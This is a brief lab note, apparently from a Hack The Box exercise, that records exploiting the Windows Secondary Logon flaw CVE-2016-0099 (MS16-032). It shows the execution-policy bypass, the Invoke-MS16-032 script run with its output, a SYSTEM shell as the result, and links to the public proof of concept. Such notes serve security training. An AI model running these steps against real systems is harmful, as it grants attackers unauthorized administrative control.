# CVE-2016-0099 - MS16-032 - Windows - Secondary Logon Elevation of Privilege Vulnerability

## Exploit

```powershell
PS C:\Users\htb-student> Set-ExecutionPolicy -ExecutionPolicy unrestricted -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): y

PS C:\Users\htb-student> Import-Module C:\Tools\Invoke-MS16-032.ps1

PS C:\Users\htb-student> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2272

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2268
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

```cmd
C:\Users\htb-student>whoami
nt authority\system
```

## Link

- [ExploitDB - PoC - CVE-2016-0099](https://www.exploit-db.com/exploits/39719)
- [Microsoft - MS16-032](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-032)
- [Github - CVEDB - CVE-2016-0099](https://github.com/CVEDB/Poc-Git/blob/fe80d49bed661ba5913e1629e24b537293aec687/2016/CVE-2016-0099.md)
